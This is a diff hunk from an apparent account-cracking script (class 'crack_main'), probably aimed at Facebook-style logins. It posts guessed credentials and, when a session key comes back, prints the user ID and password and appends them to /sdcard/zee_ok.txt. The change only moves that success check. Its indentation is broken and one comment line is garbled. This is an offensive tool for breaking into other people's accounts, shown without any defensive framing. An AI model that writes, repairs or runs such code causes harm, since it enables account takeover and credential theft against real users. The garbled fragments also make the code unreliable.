@@ -441,11 +441,11 @@ class crack_main():
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                                 #print(po,hdata)ata)
+                                if 'session_key' in po:
                                 try:
                                         roid = str(po['uid'])
                                 except:
                                         roid = iid
-                                if 'session_key' in po:
                                         print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
                                         open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
                                         ok.append(iid)
